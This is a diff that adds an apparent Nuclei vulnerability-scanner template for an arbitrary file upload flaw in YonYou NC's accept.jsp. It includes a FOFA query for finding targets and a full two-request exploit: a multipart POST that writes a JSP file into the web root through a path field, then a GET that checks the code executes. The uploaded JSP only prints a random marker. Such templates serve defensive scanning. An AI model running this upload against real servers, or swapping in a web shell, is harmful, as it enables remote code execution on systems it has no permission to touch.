@@ -1,0 +1,50 @@
+id: yonyou-nc-accept-fileupload
+
+info:
+  name: YonYou NC Accept Upload - Arbitray File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html
+    - https://mp.weixin.qq.com/s?__biz=MzkyMTMwNjU1Mg==&chksm=c184c6a1f6f34fb788437557f0e7708c74b16928e5973772db09b12067f10cf28b108701f67a&idx=1&lang=zh_CN&mid=2247488118&sn=16217c422eafc656df5fcacee9aa2153&token=857848930#rd
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: icon_hash="1085941792"
+  tags: yonyou,nc,intrusive,fileupload
+
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+        Accept-Encoding: gzip
+
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"
+        Content-Type: text/plain
+
+        <% out.println("{{randstr_2}}"); %>
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="fname"
+
+        \webapps\nc_web\{{randstr_3}}.jsp
+        -----------------------------16314487820932200903769468567--
+      - |
+        GET /{{randstr_3}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
+        condition: and
+
+# digest: 490a004630440220518a3baba6f10679a1b190066ccde7721347a5e9e36904c65a310b4befa16f540220205f5d9c798bc4541567cf6711292cda00347b9e7c916d888fdff343e6cec6da:922c64590222798bb761d5b6d8e72950
